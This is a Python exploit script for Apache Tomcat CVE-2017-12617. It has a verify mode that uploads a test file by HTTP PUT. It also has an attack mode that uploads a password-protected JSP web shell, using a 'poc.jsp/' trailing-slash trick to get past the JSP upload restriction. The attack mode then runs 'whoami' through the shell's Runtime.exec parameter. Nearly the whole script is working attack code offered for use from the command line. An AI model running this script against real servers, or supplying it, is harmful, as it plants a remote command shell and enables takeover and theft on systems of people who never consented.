#!/usr/bin/env python
# -*- coding: utf-8 -*-


import requests
import argparse
import sys
import urlparse
import re


def verify(url,port):
    vul_url = url+":"+port
    print("target:",vul_url)
    
    poc_path = urlparse.urljoin(vul_url,"test.txt")
    print(poc_path)
    payload = "This is Vulnerable CVE-2017-12617!"

    poc_req = requests.put(url = poc_path,data = payload, verify = False)
    
    poc_content = requests.get(url = poc_path,verify = False).content
    if("CVE-2017-12617" in poc_content):
        print("CVE-2017-12617 exsits in this target!")
    else:
        print("No CVE-2017-12617 in this target!") 


def attack(url,port):
    payload = """<%
    if("password".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>"""
    vul_url = url+":"+port
    print("target:",vul_url)
    
    #由于本身不允许直接上传jsp文件，但可能可以通过构造绕过
    #参考:https://www.cnblogs.com/leixiao-/p/10264236.html
    poc_path = urlparse.urljoin(vul_url,"poc.jsp/")
    print(poc_path)

    poc_req = requests.put(url = poc_path,data = payload, verify = False)
    print(poc_req.status_code)
    poc_content = requests.get(url = urlparse.urljoin(vul_url,"poc.jsp")+"?pwd=password&i=whoami",verify = False).content
    if(poc_content==""):
        print("Attack failed!")
    else:
        print("whoami result:",poc_content)
        print("Attack success!")    


if __name__=='__main__':
    parser = argparse.ArgumentParser(description="Apache Tomcat CVE-2017-12617")
    parser.add_argument("-u", "--url", required=True,help="URL of target")
    parser.add_argument("-p", "--port",required=True,help="PORT of target")
    parser.add_argument("--choice",choices=['attack', 'verify'],help="verify or attack")
    args = parser.parse_args()
    
    if args.choice=='verify':
        verify(args.url,args.port)

    if args.choice=='attack':
        attack(args.url,args.port) 
